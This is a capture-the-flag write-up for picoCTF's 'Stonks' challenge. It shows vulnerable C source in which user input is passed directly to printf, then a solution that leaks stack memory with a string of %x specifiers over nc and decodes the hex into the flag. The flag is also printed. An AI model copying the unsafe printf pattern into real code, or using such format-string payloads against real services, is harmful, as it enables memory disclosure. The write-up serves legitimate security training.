# Stonks

---

### **Author:** Madstacks
### **Category:** Bin

![](https://i.imgur.com/cGVwuQT.png)


---
## Description


I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! vuln.c nc mercury.picoctf.net 33411


```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define FLAG_BUFFER 128
#define MAX_SYM_LEN 4

typedef struct Stonks {
	int shares;
	char symbol[MAX_SYM_LEN + 1];
	struct Stonks *next;
} Stonk;

typedef struct Portfolios {
	int money;
	Stonk *head;
} Portfolio;

int view_portfolio(Portfolio *p) {
	if (!p) {
		return 1;
	}
	printf("\nPortfolio as of ");
	fflush(stdout);
	system("date"); // TODO: implement this in C
	fflush(stdout);

	printf("\n\n");
	Stonk *head = p->head;
	if (!head) {
		printf("You don't own any stonks!\n");
	}
	while (head) {
		printf("%d shares of %s\n", head->shares, head->symbol);
		head = head->next;
	}
	return 0;
}

Stonk *pick_symbol_with_AI(int shares) {
	if (shares < 1) {
		return NULL;
	}
	Stonk *stonk = malloc(sizeof(Stonk));
	stonk->shares = shares;

	int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
	for (int i = 0; i <= MAX_SYM_LEN; i++) {
		if (i < AI_symbol_len) {
			stonk->symbol[i] = 'A' + (rand() % 26);
		} else {
			stonk->symbol[i] = '\0';
		}
	}

	stonk->next = NULL;

	return stonk;
}

int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");

	// TODO: Figure out how to read token from file, for now just ask

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}

Portfolio *initialize_portfolio() {
	Portfolio *p = malloc(sizeof(Portfolio));
	p->money = (rand() % 2018) + 1;
	p->head = NULL;
	return p;
}

void free_portfolio(Portfolio *p) {
	Stonk *current = p->head;
	Stonk *next = NULL;
	while (current) {
		next = current->next;
		free(current);
		current = next;
	}
	free(p);
}

int main(int argc, char *argv[])
{
	setbuf(stdout, NULL);
	srand(time(NULL));
	Portfolio *p = initialize_portfolio();
	if (!p) {
		printf("Memory failure\n");
		exit(1);
	}

	int resp = 0;

	printf("Welcome back to the trading app!\n\n");
	printf("What would you like to do?\n");
	printf("1) Buy some stonks!\n");
	printf("2) View my portfolio\n");
	scanf("%d", &resp);

	if (resp == 1) {
		buy_stonks(p);
	} else if (resp == 2) {
		view_portfolio(p);
	}

	free_portfolio(p);
	printf("Goodbye!\n");

	exit(0);
}

```

---

## Solution

Connecting the service given:

**output**
```
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
```

if we inspect the source code, we can see that if we choose to buy stonks, we are able to enter a string which is used as the format string for `printf`

This is vulnerable to a format [string attack](https://en.wikipedia.org/wiki/Uncontrolled_format_string).

```c
printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);
```

we can get some leaks from the program by using `%x`

```
root@immalegend:~$ nc mercury.picoctf.net 33411
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Buying stonks with token:
8de5390804b00080489c3f7ef2d80ffffffff18de3160f7f00110f7ef2dc708de418078de53708de53906f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6334326136613431ffa4007df7f2daf8f7f00440f4c0fc0010f7d8fbe9f7f010c0f7ef25c0f7ef2000ffa465e8f7d8058df7ef25c0
Portfolio as of Wed Jan  5 20:55:42 UTC 2022


7 shares of HG
12 shares of T
22 shares of LBBT
13 shares of E
17 shares of CLLY
Goodbye!
```

Now, it looks like hex. I reformatted it in [CyberChef](https://gchq.github.io/CyberChef/):


```
8de5390804b00080489c3f7ef2d80ffffffff18de3160f7f00110f7ef2dc708de418078de53708de53906f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6334326136613431ffa4007df7f2daf8f7f00440f4c0fc0010f7d8fbe9f7f010c0f7ef25c0f7ef2000ffa465e8f7d8058df7ef25c0
```

if we clean this up, we get:
```
6f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6334326136613431ffa4007d
```

![](https://i.imgur.com/e8d5vhj.png)


**Flag: **
```
picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6
```


